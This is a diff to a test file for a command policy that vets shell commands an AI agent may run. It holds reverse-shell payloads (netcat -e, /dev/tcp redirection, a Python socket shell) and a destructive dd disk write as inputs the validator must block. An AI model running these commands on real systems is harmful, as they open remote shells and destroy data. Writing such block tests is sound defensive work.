@@ -13,9 +13,11 @@ describe('AI Practitioner command policy', () => {
     expect(validatePractitionerCommand('nmap -sV 127.0.0.1')).toEqual({ ok: true, risk: 'read-only' });
   });
 
-  it('marks package and system changes for explicit approval', () => {
+  it('marks package, service and file changes for explicit approval', () => {
     expect(classifyPractitionerCommand('sudo apt-get install -y nmap')).toBe('changes-system');
     expect(validatePractitionerCommand('sudo systemctl restart nginx')).toEqual({ ok: true, risk: 'changes-system' });
+    expect(validatePractitionerCommand("echo 'hello' > /tmp/lesson.txt")).toEqual({ ok: true, risk: 'changes-system' });
+    expect(validatePractitionerCommand("printf '%s\\n' hello > /tmp/lesson.txt")).toEqual({ ok: true, risk: 'changes-system' });
   });
 
   it('blocks destructive disk, root filesystem and lifecycle commands', () => {
@@ -25,9 +27,12 @@ describe('AI Practitioner command policy', () => {
     expect(validatePractitionerCommand('dd if=/tmp/image of=/dev/xvda').ok).toBe(false);
   });
 
-  it('blocks remote-shell payloads while allowing ordinary netcat inspection', () => {
+  it('blocks common remote-shell payload families while allowing ordinary netcat inspection', () => {
     expect(validatePractitionerCommand('nc -vz 127.0.0.1 22').ok).toBe(true);
     expect(validatePractitionerCommand('nc 10.0.0.2 4444 -e /bin/bash').ok).toBe(false);
+    expect(validatePractitionerCommand('bash -i >& /dev/tcp/10.0.0.2/4444 0>&1').ok).toBe(false);
+    expect(validatePractitionerCommand('bash -i | nc 10.0.0.2 4444').ok).toBe(false);
+    expect(validatePractitionerCommand("python3 -c 'import socket,os,subprocess; s=socket.socket(); os.dup2(s.fileno(),0); subprocess.call([\"/bin/sh\",\"-i\"])'").ok).toBe(false);
   });
 
   it('bounds evidence retained by the practitioner', () => {
